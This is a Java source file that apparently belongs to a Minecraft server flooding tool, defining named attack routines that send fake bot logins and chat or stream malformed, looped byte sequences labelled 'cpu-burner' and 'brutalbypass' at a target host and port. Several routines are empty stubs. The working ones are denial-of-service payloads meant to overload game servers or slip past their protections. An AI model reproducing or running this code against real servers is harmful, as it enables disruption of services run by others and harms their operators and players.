package com.minecraftbot.flood;

import com.minecraftbot.util.Vars;

import java.io.DataOutputStream;
import java.io.IOException;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;
import java.util.Set;

public class Flooders {

    // change this to whatever u want
    public static int LOOP_AMOUNT = 2000;
    private Map<String, Flooder> flooders = new HashMap<>();

    public Flooders() {
        flooders.put("bots", (out, host, port) -> {
            // status
            byte[] handshakeStatus = Vars.handshake(host, port, 1);
            Vars.writeVarInt(out, handshakeStatus.length);
            out.write(handshakeStatus);
            byte[] status = Vars.status();
            Vars.writeVarInt(out, status.length);
            out.write(status);
            // login
            byte[] handshake = Vars.handshake(host, port, 2);
            Vars.writeVarInt(out, handshake.length);
            out.write(handshake);
            byte[] login = Vars.login("Test");
            Vars.writeVarInt(out, login.length);
            out.write(login);
            // chat
            byte[] chat = Vars.chat("This is a test");
            Vars.writeVarInt(out, chat.length);
            out.write(chat);
        });

        flooders.put("cpu-burner1", (out, host, port) -> {
            out.write(0);
            out.write(48);
            out.write(5);
            out.write(98);
            out.write(-22);
            out.write(1);
            for (int i = 0; i < LOOP_AMOUNT; i++) {
                out.write(-1);
                out.write(-0);
            }
        });
        flooders.put("cpu-burner2", (out, host, port) -> {

        });
        flooders.put("cpu-burner3", (out, host, port) -> {

        });
        flooders.put("cpu-burner4", (out, host, port) -> {

        });
        flooders.put("cpu-burner5", (out, host, port) -> {

        });
        flooders.put("bosshandler", (out, host, port) -> {

        });
        flooders.put("brutalbypass1", (out, host, port) -> {
            out.write(-1);
            out.write(-0);
            out.write(-11);
            out.write(254);
            out.write(+-31);
            out.write(253);
            for (int i = 0; i < LOOP_AMOUNT; i++) {
                out.write(+-1);
                out.write(+-0);
            }
        });
        flooders.put("brutalbypass2", (out, host, port) -> {
            out.write(-72);
            for (int i = 0; i < LOOP_AMOUNT; i++) {
                out.write(+-1);
                out.write(+-0);
            }
        });
    }

    public Set<String> getFlooders() {
        return new HashSet<>(flooders.keySet());
    }

    public Flooder findById(String id) {
        return flooders.get(id);
    }

    @FunctionalInterface
    public interface Flooder {
        void flood(DataOutputStream dataOutputStream, String string, int value) throws IOException;
    }

}
